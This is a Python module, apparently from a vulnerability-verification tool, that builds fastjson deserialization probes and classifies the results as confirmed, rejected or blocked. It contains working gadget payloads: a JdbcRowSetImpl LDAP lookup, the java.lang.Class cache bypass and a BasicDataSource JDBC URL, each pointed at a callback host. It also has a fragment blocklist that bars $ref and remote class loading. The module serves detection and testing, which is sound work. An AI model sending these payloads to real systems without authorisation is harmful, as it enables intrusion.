"""fastjson 系不安全反序列化的**判定面**（M26-a）：矩阵构造、编码、对照、三态 ``judge``。

## 这个模块回答什么

"目标真的解析了我们给的 ``@type`` 吗？" —— 只有一种事实能回答：**目标去解析了我们
给的主机名**（DNS 查询或 TCP 连接到达观察点）。本模块不发送任何请求（发送在
``proofhound/fastjsonprobe.py``）、不碰网络，全部是**纯函数**：模板 → 探针计划 →
（CLI 发出去）→ 响应字节 → 三态。

## 交接单纠正的第一件事：不是"开了 autoType 才有洞"

fastjson 的历史攻击面有四层，本单只做两层（其余见裁定 8）：

| 层 | 依赖 | 本模块的探针 |
|---|---|---|
| **A** 默认配置即可命中 | 黑名单绕过 / 类缓存两步链 | ``ldap-class-cache``（``java.lang.Class`` 缓存 + ``JdbcRowSetImpl``） |
| **B** 需显式 autoType | ``SupportAutoType`` 开着 | ``Inet4Address`` 系列 + ``JdbcRowSetImpl`` / ``BasicDataSource`` |
| C 非 ``@type`` 面 | ``$ref`` / JSONPath / setter 绑定 | **不做**（``$ref`` 还会被 :func:`safety_reasons` 直接拒发） |
| D 其它库 | Jackson/XStream/… | **不做**（留给泛化） |

只做 B 层等于系统性漏掉"默认配置就能打"的那一支，故 A 层两项**永不被预算挤掉**。

## 三态（宁漏勿滥）

- **confirmed**：观察点收到**本次唯一 token**的回调（DNS 全等 / TCP 端口归因）
  **且** ``gadget-control`` 零观测 **且** 阳性对照成立（且不是回显）；
- **rejected**：阳性对照成立 **且** **全部** gadget 族都被目标以**明确拒绝语义**
  （``autoType is not support`` / ``safeMode not support autoType`` / gadget 类的
  ``ClassNotFoundException``）驳回 **且** 零观测；
- **blocked**：其余一切——对照被吞、回显嫌疑、观察点不可用、部分族沉默、对照命中、
  请求失败、证据不足以区分上面两态。

**"没测出来"只能写 blocked**：版本、开关、黑名单、出站策略四者任一都能造成同样的沉默。

## 回显 ≠ 证据（阳性对照必须要求一次真实变换）

``/login/echo`` 这类端点会把解码后的 JSON 原样吐回——类名、域名、``@type`` 字样全在响应里。
故阳性对照的类名写成 **JSON 转义形态** ``proofhound\\u002e<8hex>``：

- 真解析器解码后查类，报错文本里是**解码形态** ``proofhound.<8hex>``；
- 原样回显的端点只能回吐**转义形态** ``proofhound\\u002e<8hex>``。

判据因此是"解码形态出现 **且** 转义形态不出现"。这与 M25-a 的 ``alive`` 字符引用同构，
且**不增加请求数**。另外还查一遍"整个请求 JSON 被原样回显"——两条独立判据。

## 不做

``$ref`` 循环（DoS）、超大/深嵌套 JSON、命令执行/写文件/反连 Shell 的 gadget、
``javaCodebase`` 远程类加载、盲打时间侧信道、绕过库的完整复刻。
"""

from __future__ import annotations

import base64
import hashlib
import json
import re
import secrets
import urllib.parse
from dataclasses import dataclass, field

from proofhound.verify.observe import Observation, canonical_token

# =====================================================================
# 常量
# =====================================================================

#: 表单字段名缺省值（``json=<base64>`` 是实战里最常见的入口形态）。
DEFAULT_FIELD = "json"

#: 注入业务字段的缺省键名（无 ``--json-template`` 时的嵌套位）。
DEFAULT_JSON_KEY = "data"

#: 提交体类型：表单（base64 形态）与 JSON（raw 形态）。
FORM_CONTENT_TYPE = "application/x-www-form-urlencoded"
JSON_CONTENT_TYPE = "application/json"

#: 编码名。前三个是 base64 的三个变体（服务端用哪种只有打了才知道），``raw`` 是 JSON body。
ENCODING_B64 = "b64"
ENCODING_B64URL = "b64url"
ENCODING_B64NOPAD = "b64-nopad"
ENCODING_RAW = "raw"
BASE64_ENCODINGS = (ENCODING_B64, ENCODING_B64URL, ENCODING_B64NOPAD)
ENCODINGS = (*BASE64_ENCODINGS, ENCODING_RAW)

#: 每入口的**硬上限**（交接单 §4.3）：超了就按优先级截断，绝不放宽。
MAX_REQUESTS_PER_ENTRY = 12

#: 单个 body 的硬上限（超过即拒发：那是 DoS，不是本类型）。
MAX_BODY_BYTES = 32 * 1024

#: 允许的最大 JSON 嵌套深度（拒发"递归/嵌套爆炸"）。
MAX_JSON_DEPTH = 12

#: 禁用片段（写死，不可配置）：引用式 DoS 与远程类加载。
FORBIDDEN_FRAGMENTS = ("$ref", "javaCodebase", "javaFactory", "JNDIReferenceFactory")

#: 探针角色。
ROLE_BASELINE = "baseline"
ROLE_PARSE_CONTROL = "parse-control"
ROLE_GADGET = "gadget"
ROLE_CONTROL = "control"
ROLE_RETEST = "retest"

#: 三态。
VERDICT_CONFIRMED = "confirmed"
VERDICT_REJECTED = "rejected"
VERDICT_BLOCKED = "blocked"

#: 阳性对照的类名前缀（后面接 8 位 hex）。
PARSE_CONTROL_PREFIX = "proofhound"

#: 阳性对照的**转义形态**分隔符：JSON 里写 ``\u002e``，解析后是 ``.``。
PARSE_CONTROL_ESCAPED_DOT = r"\u002e"

#: 明确的拒绝语义（fastjson 各版本措辞不同，统一小写比对）。
REFUSAL_MARKERS = (
    b"autotype is not support",
    b"autotype is not supported",
    b"auto type is not support",
    b"safemode not support",
    b"safemode not supported",
    b"securityexception",
    b"classnotfoundexception",
    b"autotypesupport",
)

#: 观察点通道。
CHANNEL_DNS = "dns"
CHANNEL_TCP_LDAP = "tcp-ldap"
CHANNEL_TCP_JDBC = "tcp-jdbc"

#: gadget 名（顺序即**优先级**：越靠前越不会被预算挤掉）。
GADGET_DNS_NESTED = "dns-nested"
GADGET_CLASS_CACHE = "ldap-class-cache"
GADGET_LDAP_ROWSET = "ldap-jdbcrowset"
GADGET_DNS_TOPLEVEL = "dns-toplevel"
GADGET_JDBC_BASIC = "jdbc-basicdatasource"
GADGET_DNS_LCLASS = "dns-lclass"
GADGET_DNS_ARRAY = "dns-array"
GADGET_DNS_UNICODE = "dns-unicode"


@dataclass(frozen=True)
class Gadget:
    """一个 gadget 族（名字 / 通道 / 攻击面层次 / 取哪种包装）。"""

    name: str
    channel: str
    layer: str  # "A" = 默认配置即可命中；"B" = 需显式 autoType
    wrapper: str  # "nested" | "top" | "array"


#: gadget 全表（**顺序 = 优先级**）。A 层两项与两个 TCP 族是"永不被挤掉"的必做项。
GADGETS: tuple[Gadget, ...] = (
    Gadget(GADGET_DNS_NESTED, CHANNEL_DNS, "B", "nested"),
    Gadget(GADGET_CLASS_CACHE, CHANNEL_TCP_LDAP, "A", "top"),
    Gadget(GADGET_LDAP_ROWSET, CHANNEL_TCP_LDAP, "B", "nested"),
    Gadget(GADGET_DNS_TOPLEVEL, CHANNEL_DNS, "B", "top"),
    Gadget(GADGET_JDBC_BASIC, CHANNEL_TCP_JDBC, "B", "nested"),
    Gadget(GADGET_DNS_LCLASS, CHANNEL_DNS, "B", "top"),
    Gadget(GADGET_DNS_ARRAY, CHANNEL_DNS, "B", "array"),
    Gadget(GADGET_DNS_UNICODE, CHANNEL_DNS, "B", "top"),
)

#: 必做项（预算再紧也不裁；交接单 §7 断言 5）。
GADGETS_MANDATORY = (GADGET_DNS_NESTED, GADGET_CLASS_CACHE, GADGET_LDAP_ROWSET, GADGET_JDBC_BASIC)

_GADGET_BY_NAME = {gadget.name: gadget for gadget in GADGETS}


def get_gadget(name: str) -> Gadget:
    """按名取 gadget（未登记即抛——fail-closed，不猜）。"""
    gadget = _GADGET_BY_NAME.get(name)
    if gadget is None:
        raise FastjsonError(f"未知 gadget：{name!r}")
    return gadget


class FastjsonError(ValueError):
    """模板/编码/计划不合法（结构性失败，不发出任何请求）。"""


# =====================================================================
# 阳性对照 / token
# =====================================================================


def new_control_marker() -> str:
    """阳性对照的 8 位 hex（每次运行唯一）。"""
    return secrets.token_hex(4)


def parse_control_class(marker: str) -> str:
    """类名的**解码形态**（真解析器报错文本里出现的那个）。"""
    return f"{PARSE_CONTROL_PREFIX}.{marker}"


def parse_control_fragment(marker: str) -> str:
    """阳性对照对象的 JSON 片段：类名里的点写成 ``\\u002e``（回显陷阱的判别位）。"""
    return (
        '{"@type":"%s%s%s"}'
        % (PARSE_CONTROL_PREFIX, PARSE_CONTROL_ESCAPED_DOT, marker)
    )


def parse_control_state(body: bytes, marker: str) -> str:
    """阳性对照的三态：``held`` / ``echo_suspect`` / ``absent``。

    ``held`` 要求**解码形态**出现且**转义形态**不出现——即目标真的做了一次 JSON 变换；
    两种形态都出现只可能是原样回显（或既回显又解析，按保守处理）。
    """
    if not body:
        return "absent"
    decoded = parse_control_class(marker).encode("utf-8")
    escaped = (PARSE_CONTROL_PREFIX + PARSE_CONTROL_ESCAPED_DOT + marker).encode("utf-8")
    if escaped in body:
        return "echo_suspect"
    if decoded in body:
        return "held"
    return "absent"


def is_refusal(body: bytes) -> bool:
    """响应里是否有**明确的拒绝语义**（证明 @type 被处理过但被挡下）。"""
    if not body:
        return False
    lowered = body.lower()
    return any(marker in lowered for marker in REFUSAL_MARKERS)


def reflected_request(body: bytes, json_text: str) -> bool:
    """响应里是否**原样**出现了整个请求 JSON（回显端点的第二条独立判据）。"""
    if not body or not json_text:
        return False
    needle = json_text.encode("utf-8")
    return needle in body


# =====================================================================
# 编码：base64 三变体 + raw
# =====================================================================


def encode_body(json_text: str, *, encoding: str, field: str = DEFAULT_FIELD) -> bytes:
    """把 JSON 文本编码成请求体（base64 变体走表单，raw 走 JSON body）。"""
    if encoding == ENCODING_RAW:
        return json_text.encode("utf-8")
    if encoding not in BASE64_ENCODINGS:
        raise FastjsonError(f"未知编码：{encoding!r}（支持：{', '.join(ENCODINGS)}）")
    raw = json_text.encode("utf-8")
    if encoding == ENCODING_B64:
        value = base64.b64encode(raw).decode("ascii")
    elif encoding == ENCODING_B64URL:
        value = base64.urlsafe_b64encode(raw).decode("ascii")
    else:  # b64-nopad
        value = base64.b64encode(raw).decode("ascii").rstrip("=")
    return urllib.parse.urlencode({field: value}).encode("ascii")


def decode_body(body: bytes, *, encoding: str, field: str = DEFAULT_FIELD) -> str | None:
    """请求体 → JSON 文本（**仅证据落盘用**；解不出返回 None）。"""
    try:
        if encoding == ENCODING_RAW:
            return body.decode("utf-8")
        parsed = urllib.parse.parse_qs(body.decode("ascii"), keep_blank_values=True)
        values = parsed.get(field) or []
        if not values:
            return None
        value = values[0]
        padding = "=" * (-len(value) % 4)
        decoded = base64.urlsafe_b64decode(value + padding).decode("utf-8")
        return decoded or None
    except (ValueError, UnicodeDecodeError, KeyError):
        return None


def content_type_for(encoding: str) -> str:
    """编码决定缺省 content-type（``raw`` 是 JSON body，其余是表单）。"""
    return JSON_CONTENT_TYPE if encoding == ENCODING_RAW else FORM_CONTENT_TYPE


def alternate_encodings(primary: str) -> tuple[str, ...]:
    """阳性对照静默时，还要补试的另外两种 base64 变体（raw 没有"其它变体"）。"""
    if primary not in BASE64_ENCODINGS:
        return ()
    return tuple(item for item in BASE64_ENCODINGS if item != primary)


# =====================================================================
# JSON 模板与注入位
# =====================================================================

#: 注入 gadget 时用的占位符（序列化后按"带引号的字符串"整体替换成 JSON 片段）。
_GADGET_PLACEHOLDER = "__PROOFHOUND_GADGET_PLACEHOLDER__"


def parse_json_template(text: str) -> dict:
    """解析操作员给的 JSON body 模板（**必须是非空对象**，数组/标量一律拒）。"""
    try:
        data = json.loads(text)
    except json.JSONDecodeError as exc:
        raise FastjsonError(f"JSON 模板不是合法 JSON：{exc}") from None
    if not isinstance(data, dict) or not data:
        raise FastjsonError("JSON 模板必须是非空对象（数组/标量无法嵌 @type）")
    if _GADGET_PLACEHOLDER in text:
        raise FastjsonError("JSON 模板里不允许出现注入占位符字面量")
    return data


def choose_injection_key(template: dict, explicit: str | None = None) -> str:
    """选注入字段：显式给的最优先；否则取**第一个值为字符串/对象**的顶层字段。"""
    if explicit:
        if explicit not in template:
            raise FastjsonError(f"JSON 模板里没有字段 {explicit!r}")
        return explicit
    for key, value in template.items():
        if isinstance(value, (str, dict)):
            return key
    raise FastjsonError("JSON 模板里没有可注入的字段（需要一个字符串或对象字段）")


def _json_text(value: object) -> str:
    """确定性序列化（紧凑、保留非 ASCII）。"""
    return json.dumps(value, ensure_ascii=False, separators=(",", ":"))


def _embed(template: dict, key: str, fragment: str) -> str:
    """把 JSON 片段嵌到模板的 ``key`` 位（其余字段原样保留）。"""
    clone = json.loads(json.dumps(template))  # 深拷贝，避免污染调用方
    clone[key] = _GADGET_PLACEHOLDER
    text = _json_text(clone)
    replacement = '"%s"' % _GADGET_PLACEHOLDER
    if replacement not in text:  # pragma: no cover - 防御性
        raise FastjsonError("注入占位符没有出现在序列化结果里")
    return text.replace(replacement, fragment)


# =====================================================================
# gadget 片段
# =====================================================================


#: 回调主机名白名单（拼进 JSON 前先校验，避免把引号/花括号带进 body）。
_SAFE_HOST = re.compile(r"^[A-Za-z0-9._:\-]+$")


@dataclass(frozen=True)
class CallbackPlan:
    """一次探针的回调落点（DNS 用 ``qname``，TCP 用 ``host``+``port``）。"""

    token: str
    channel: str
    qname: str | None = None
    host: str | None = None
    port: int | None = None

    def __post_init__(self) -> None:
        if canonical_token(self.token) is None:
            raise FastjsonError(f"不是合法的观察 token：{self.token!r}")
        if self.channel == CHANNEL_DNS:
            if not self.qname:
                raise FastjsonError("DNS 通道需要 qname")
        elif self.channel in (CHANNEL_TCP_LDAP, CHANNEL_TCP_JDBC):
            if not self.host or not self.port:
                raise FastjsonError("TCP 通道需要 host 与 port")
            if not _SAFE_HOST.match(str(self.host)):
                raise FastjsonError(f"回调主机名含非法字符：{self.host!r}")
        else:
            raise FastjsonError(f"未知回调通道：{self.channel!r}")

    @property
    def ldap_url(self) -> str:
        return f"ldap://{self.host}:{self.port}/{self.token}"

    @property
    def jdbc_url(self) -> str:
        return f"jdbc:mysql://{self.host}:{self.port}/{self.token}"


def _inet4_fragment(qname: str, *, type_literal: str = "java.net.Inet4Address") -> str:
    return '{"@type":"%s","val":"%s"}' % (type_literal, qname)


def _jdbc_rowset_fragment(callback: CallbackPlan) -> str:
    return (
        '{"@type":"com.sun.rowset.JdbcRowSetImpl",'
        '"dataSourceName":"%s","autoCommit":true}' % callback.ldap_url
    )


def _class_cache_fragment(callback: CallbackPlan) -> str:
    """A 层：``java.lang.Class`` 缓存两步链（默认配置即可命中，必须做）。"""
    return (
        '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},'
        '"b":%s}' % _jdbc_rowset_fragment(callback)
    )


def _basic_datasource_fragment(callback: CallbackPlan) -> str:
    return (
        '{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",'
        '"url":"%s"}' % callback.jdbc_url
    )


def gadget_fragment(gadget: str, callback: CallbackPlan) -> str:
    """按 gadget 名产出一个 **JSON 对象片段**（不含外层包装）。"""
    if gadget in (GADGET_DNS_NESTED, GADGET_DNS_TOPLEVEL, GADGET_DNS_ARRAY):
        return _inet4_fragment(callback.qname or "")
    if gadget == GADGET_DNS_LCLASS:
        return _inet4_fragment(callback.qname or "", type_literal="Ljava.net.Inet4Address;")
    if gadget == GADGET_DNS_UNICODE:
        # 只有一个 ``\u`` 转义：真解析器解码成 Inet4Address，回显端点只能原样吐转义
        return _inet4_fragment(
            callback.qname or "", type_literal=r"java.net.Inet4\u0041ddress"
        )
    if gadget == GADGET_CLASS_CACHE:
        return _class_cache_fragment(callback)
    if gadget == GADGET_LDAP_ROWSET:
        return _jdbc_rowset_fragment(callback)
    if gadget == GADGET_JDBC_BASIC:
        return _basic_datasource_fragment(callback)
    raise FastjsonError(f"未知 gadget：{gadget!r}")


def wrap_fragment(fragment: str, *, wrapper: str, json_key: str) -> str:
    """把对象片段包装成顶层 payload（嵌套 / 顶层 / 数组）。"""
    if wrapper == "top":
        return fragment
    if wrapper == "array":
        return f"[{fragment}]"
    if wrapper == "nested":
        return '{"%s":%s}' % (json_key, fragment)
    raise FastjsonError(f"未知包装：{wrapper!r}")


def control_fragment(gadget: str, callback: CallbackPlan) -> str:
    """阴性对照：**同 URL、无 ``@type``**，把回调地址当普通业务字段值。"""
    if gadget in (
        GADGET_DNS_NESTED,
        GADGET_DNS_TOPLEVEL,
        GADGET_DNS_ARRAY,
        GADGET_DNS_LCLASS,
        GADGET_DNS_UNICODE,
    ):
        return '{"val":"%s"}' % (callback.qname or "")
    if gadget in (GADGET_LDAP_ROWSET, GADGET_CLASS_CACHE):
        return '{"dataSourceName":"%s"}' % callback.ldap_url
    if gadget == GADGET_JDBC_BASIC:
        return '{"url":"%s"}' % callback.jdbc_url
    raise FastjsonError(f"未知 gadget：{gadget!r}")


def control_wrapper(gadget: str) -> str:
    """对照的包装与它所对照的 gadget 一致（同 URL、同形态，只少 ``@type``）。"""
    return _GADGET_BY_NAME[gadget].wrapper


# =====================================================================
# 探针计划
# =====================================================================


@dataclass(frozen=True)
class ProbeSpec:
    """一个待发送的探针（**解码后的 JSON**；编码在 CLI 层做，便于证据落盘）。"""

    name: str
    role: str
    gadget: str | None
    channel: str | None
    json_text: str
    token: str | None = None
    qname: str | None = None
    port: int | None = None

    @property
    def body_sha256(self) -> str:
        return hashlib.sha256(self.json_text.encode("utf-8")).hexdigest()


def baseline_spec(*, template: dict | None, json_key: str) -> ProbeSpec:
    """基线：同结构 JSON、**无 ``@type``**、参数值正常。"""
    if template is None:
        text = _json_text({json_key: "1"})
    else:
        text = _json_text(template)
    return ProbeSpec(
        name=ROLE_BASELINE, role=ROLE_BASELINE, gadget=None, channel=None, json_text=text
    )


def parse_control_spec(
    *, marker: str, template: dict | None, json_key: str
) -> ProbeSpec:
    """阳性对照：未知类名（转义形态），证明 ``@type`` 被**处理**而不是被回显。"""
    fragment = parse_control_fragment(marker)
    if template is None:
        text = wrap_fragment(fragment, wrapper="nested", json_key=json_key)
    else:
        text = _embed(template, json_key, fragment)
    return ProbeSpec(
        name=ROLE_PARSE_CONTROL,
        role=ROLE_PARSE_CONTROL,
        gadget=None,
        channel=None,
        json_text=text,
    )


def gadget_spec(
    gadget: str,
    callback: CallbackPlan,
    *,
    template: dict | None,
    json_key: str,
    name: str | None = None,
    role: str = ROLE_GADGET,
) -> ProbeSpec:
    """一个 gadget 探针（带唯一 token 的回调地址）。"""
    spec = _GADGET_BY_NAME.get(gadget)
    if spec is None:
        raise FastjsonError(f"未知 gadget：{gadget!r}")
    if callback.channel != spec.channel:
        raise FastjsonError(
            f"gadget {gadget} 需要 {spec.channel} 通道，回调给的是 {callback.channel}"
        )
    fragment = gadget_fragment(gadget, callback)
    if template is None:
        text = wrap_fragment(fragment, wrapper=spec.wrapper, json_key=json_key)
    else:
        text = _embed(template, json_key, fragment)
    return ProbeSpec(
        name=name or gadget,
        role=role,
        gadget=gadget,
        channel=spec.channel,
        json_text=text,
        token=callback.token,
        qname=callback.qname,
        port=callback.port,
    )


def control_spec(
    gadget: str,
    callback: CallbackPlan,
    *,
    template: dict | None,
    json_key: str,
) -> ProbeSpec:
    """阴性对照：与 ``gadget`` **同 URL、无 ``@type``**（非实体路径不得触发回调）。"""
    fragment = control_fragment(gadget, callback)
    if template is None:
        text = wrap_fragment(
            fragment, wrapper=control_wrapper(gadget), json_key=json_key
        )
    else:
        text = _embed(template, json_key, fragment)
    return ProbeSpec(
        name=ROLE_CONTROL,
        role=ROLE_CONTROL,
        gadget=gadget,
        channel=_GADGET_BY_NAME[gadget].channel,
        json_text=text,
        token=callback.token,
        qname=callback.qname,
        port=callback.port,
    )


def build_plan(
    callbacks: dict[str, CallbackPlan],
    *,
    marker: str,
    template: dict | None = None,
    json_key: str = DEFAULT_JSON_KEY,
) -> tuple[ProbeSpec, ...]:
    """按**优先级**排出全部探针：baseline → parse-control → gadget 族。

    ``callbacks`` 只含**当前可用通道**的 gadget（DNS 不可用就不排 DNS 族）。
    预算裁剪在 CLI 层（它才知道已经花了几次）；本函数只保证顺序与必做项在前。
    """
    plan: list[ProbeSpec] = [
        baseline_spec(template=template, json_key=json_key),
        parse_control_spec(marker=marker, template=template, json_key=json_key),
    ]
    for gadget in GADGETS:
        callback = callbacks.get(gadget.name)
        if callback is None:
            continue
        plan.append(
            gadget_spec(gadget.name, callback, template=template, json_key=json_key)
        )
    return tuple(plan)


def retest_spec(
    gadget: str,
    callback: CallbackPlan,
    *,
    template: dict | None,
    json_key: str,
) -> ProbeSpec:
    """复测：同一 gadget、**新的回调分配**（证明可复现，且归因不串线）。"""
    return gadget_spec(
        gadget,
        callback,
        template=template,
        json_key=json_key,
        name=f"{gadget}-{ROLE_RETEST}",
        role=ROLE_RETEST,
    )


# =====================================================================
# 安全闸（发送前统一核）
# =====================================================================


def _depth(value: object) -> int:
    if isinstance(value, dict):
        return 1 + max((_depth(item) for item in value.values()), default=0)
    if isinstance(value, list):
        return 1 + max((_depth(item) for item in value), default=0)
    return 1


def safety_reasons(json_text: str) -> tuple[str, ...]:
    """发送前的禁用项检查（任何一条命中即**整批不发**）。

    对应交接单 §4.1 的"禁用（写死，不可配置）"：``$ref`` 循环、超大 JSON、
    递归/嵌套爆炸、远程类加载。
    """
    reasons: list[str] = []
    encoded = json_text.encode("utf-8")
    if len(encoded) > MAX_BODY_BYTES:
        reasons.append(f"body 超过 {MAX_BODY_BYTES} 字节")
    for fragment in FORBIDDEN_FRAGMENTS:
        if fragment in json_text:
            reasons.append(f"包含禁用片段 {fragment}")
    try:
        parsed = json.loads(json_text)
    except json.JSONDecodeError as exc:
        reasons.append(f"不是合法 JSON：{exc}")
        return tuple(reasons)
    depth = _depth(parsed)
    if depth > MAX_JSON_DEPTH:
        reasons.append(f"嵌套深度 {depth} 超过 {MAX_JSON_DEPTH}")
    return tuple(reasons)


# =====================================================================
# 判定
# =====================================================================


@dataclass(frozen=True)
class ProbeResult:
    """一次已发出的探针（响应字节原样留着，判定只看字节）。"""

    name: str
    role: str
    gadget: str | None
    channel: str | None
    status: int | None
    error: str | None
    body: bytes
    json_text: str

    @property
    def answered(self) -> bool:
        """拿到了任何响应（4xx/5xx 也算，网络失败不算）。"""
        return self.error is None and self.status is not None


@dataclass(frozen=True)
class Judgment:
    """三态结论 + 全部否定项（证据与报告都从这里取）。"""

    verdict: str
    channels: tuple[str, ...]
    reasons: tuple[str, ...]
    facts: dict = field(default_factory=dict)

    @property
    def confirmed(self) -> bool:
        return self.verdict == VERDICT_CONFIRMED

    def to_dict(self) -> dict:
        return {
            "verdict": self.verdict,
            "channels": list(self.channels),
            "reasons": list(self.reasons),
            "facts": dict(self.facts),
        }


def _first(results: tuple[ProbeResult, ...], role: str) -> ProbeResult | None:
    for result in results:
        if result.role == role:
            return result
    return None


def _best_control(
    results: tuple[ProbeResult, ...], marker: str
) -> ProbeResult | None:
    """编码协商会发出多条 parse-control：优先取"成立"的那条，其次回显，最后一条。"""
    candidates = [item for item in results if item.role == ROLE_PARSE_CONTROL]
    if not candidates:
        return None
    for item in candidates:
        if parse_control_state(item.body, marker) == "held":
            return item
    for item in candidates:
        if parse_control_state(item.body, marker) == "echo_suspect":
            return item
    return candidates[-1]


def _hit_names(attributed: dict[str, tuple[Observation, ...]]) -> dict[str, tuple[Observation, ...]]:
    return {name: items for name, items in attributed.items() if items}


def judge(
    *,
    results: tuple[ProbeResult, ...] | list[ProbeResult],
    attributed: dict[str, tuple[Observation, ...]] | None = None,
    unmatched: tuple[Observation, ...] = (),
    channel_states: dict[str, tuple[bool, str]] | None = None,
    marker: str,
) -> Judgment:
    """三态判定（**零 LLM、确定性**）。

    ``attributed`` 是"探针名 → 归因到它的观察记录"（CLI 按 token/端口归因）；
    ``channel_states`` 是"通道 → (是否可用, 不可用原因)"。
    """
    results = tuple(results)
    attributed = _hit_names(attributed or {})
    channel_states = channel_states or {}
    baseline = _first(results, ROLE_BASELINE)
    control = _best_control(results, marker)
    gadget_results = [item for item in results if item.role in (ROLE_GADGET, ROLE_RETEST)]

    baseline_body = baseline.body if baseline else b""
    baseline_refusal = is_refusal(baseline_body)
    control_state = (
        parse_control_state(control.body, marker) if control is not None else "absent"
    )
    echo_suspect = control_state == "echo_suspect"
    if not echo_suspect and control is not None:
        echo_suspect = reflected_request(control.body, control.json_text)
    control_holds = control_state == "held" and not echo_suspect

    gadget_hits = {
        name: items
        for name, items in attributed.items()
        if name in {item.name for item in gadget_results}
    }
    control_hit = bool(attributed.get(ROLE_CONTROL))
    hit_channels = tuple(
        sorted({observation.channel for items in gadget_hits.values() for observation in items})
    )

    # 拒绝语义：只看**已发出**的 gadget，且要求基线本身不是拒绝页（避免整站都回
    # 同一个异常页时把"目标明确拒绝"读成假象）。
    refused = [
        item
        for item in gadget_results
        if not baseline_refusal and is_refusal(item.body)
    ]
    all_sent = [item.name for item in gadget_results]
    all_gadgets_refused = bool(gadget_results) and len(refused) == len(gadget_results)

    unanswered = [item.name for item in results if not item.answered]
    unavailable = [name for name, (ok, _reason) in channel_states.items() if not ok]

    facts = {
        "parse_control": control_state,
        "parse_control_holds": control_holds,
        "echo_suspect": echo_suspect,
        "baseline_refusal": baseline_refusal,
        "gadget_probes": all_sent,
        "gadget_hits": {
            name: [observation.channel for observation in items]
            for name, items in sorted(gadget_hits.items())
        },
        "control_hit": control_hit,
        "all_gadgets_refused": all_gadgets_refused,
        "unanswered_probes": unanswered,
        "unavailable_channels": unavailable,
        "ignored_observations": len(unmatched),
        "requests": len(results),
    }

    reasons: list[str] = []

    # ---- confirmed：观察点事实 + 阴性对照干净 + 阳性对照成立
    if gadget_hits and not control_hit and control_holds and not echo_suspect:
        reasons.append(
            "观察点收到带本次唯一 token 的回调（通道：" + "、".join(hit_channels) + "）"
        )
        reasons.append("阴性对照（同 URL、无 @type）未触发任何观测")
        reasons.append("阳性对照成立：目标报错文本里出现了类名（解码形态）")
        return Judgment(
            verdict=VERDICT_CONFIRMED,
            channels=hit_channels,
            reasons=tuple(reasons),
            facts=facts,
        )

    # ---- rejected：目标明确拒绝了**全部** gadget 族，且没有任何观测
    if control_holds and all_gadgets_refused and not gadget_hits and not control_hit:
        reasons.append("阳性对照成立：目标处理了 @type（响应里出现解码后的类名）")
        reasons.append("全部 gadget 族被目标以明确拒绝语义驳回（如 autoType is not support）")
        reasons.append("观察点零观测、阴性对照未触发")
        reasons.append("只说明该入口当前对**这组** payload 不成立，不等于目标不存在反序列化风险")
        return Judgment(
            verdict=VERDICT_REJECTED,
            channels=(),
            reasons=tuple(reasons),
            facts=facts,
        )

    # ---- blocked：其余一切（覆盖不全绝不驳回）
    if control_hit:
        reasons.append("阴性对照命中：非 @type 路径也触发了回调，回调不可归因")
    if echo_suspect:
        reasons.append("阳性对照被原样回显（收到转义形态/整个请求 JSON），不是解析证据")
    if control is None:
        reasons.append("没有发出阳性对照（预算/入口异常）")
    elif not control_holds and not echo_suspect:
        if unavailable:
            reasons.append("观察点不可用：" + "、".join(unavailable))
        reasons.append("阳性对照未成立：响应里既没有解码后的类名，也没有明确拒绝语义")
    if gadget_hits and (control_hit or not control_holds or echo_suspect):
        reasons.append("观察点有命中，但阴性对照或阳性对照不满足 ⇒ 不可归因")
    if not gadget_results:
        reasons.append("没有发出任何 gadget 探针（通道不可用或预算耗尽）")
    elif not all_gadgets_refused:
        silent = [item.name for item in gadget_results if item not in refused]
        reasons.append(
            "部分 gadget 族沉默（既无拒绝语义也无回调）：" + "、".join(silent)
        )
    if unanswered:
        reasons.append("存在未拿到响应的探针：" + "、".join(unanswered))
    if not reasons:  # pragma: no cover - 兜底，正常不会走到
        reasons.append("证据不足以区分 confirmed / rejected")
    reasons.append("沉默可能是版本黑名单、autoType 未开、gadget 被挡或出站被墙——不等于不存在漏洞")
    return Judgment(
        verdict=VERDICT_BLOCKED, channels=(), reasons=tuple(reasons), facts=facts
    )


__all__ = [
    "BASE64_ENCODINGS",
    "CHANNEL_DNS",
    "CHANNEL_TCP_JDBC",
    "CHANNEL_TCP_LDAP",
    "CallbackPlan",
    "DEFAULT_FIELD",
    "DEFAULT_JSON_KEY",
    "ENCODINGS",
    "ENCODING_B64",
    "ENCODING_B64NOPAD",
    "ENCODING_B64URL",
    "ENCODING_RAW",
    "FORM_CONTENT_TYPE",
    "FastjsonError",
    "GADGETS",
    "GADGETS_MANDATORY",
    "GADGET_CLASS_CACHE",
    "GADGET_DNS_ARRAY",
    "GADGET_DNS_LCLASS",
    "GADGET_DNS_NESTED",
    "GADGET_DNS_TOPLEVEL",
    "GADGET_DNS_UNICODE",
    "GADGET_JDBC_BASIC",
    "GADGET_LDAP_ROWSET",
    "Gadget",
    "JSON_CONTENT_TYPE",
    "Judgment",
    "MAX_BODY_BYTES",
    "MAX_REQUESTS_PER_ENTRY",
    "PARSE_CONTROL_PREFIX",
    "ProbeResult",
    "ProbeSpec",
    "ROLE_BASELINE",
    "ROLE_CONTROL",
    "ROLE_GADGET",
    "ROLE_PARSE_CONTROL",
    "ROLE_RETEST",
    "VERDICT_BLOCKED",
    "VERDICT_CONFIRMED",
    "VERDICT_REJECTED",
    "alternate_encodings",
    "baseline_spec",
    "build_plan",
    "choose_injection_key",
    "content_type_for",
    "control_spec",
    "decode_body",
    "encode_body",
    "gadget_fragment",
    "gadget_spec",
    "get_gadget",
    "is_refusal",
    "judge",
    "new_control_marker",
    "parse_control_class",
    "parse_control_fragment",
    "parse_control_state",
    "parse_control_spec",
    "parse_json_template",
    "reflected_request",
    "retest_spec",
    "safety_reasons",
    "wrap_fragment",
]
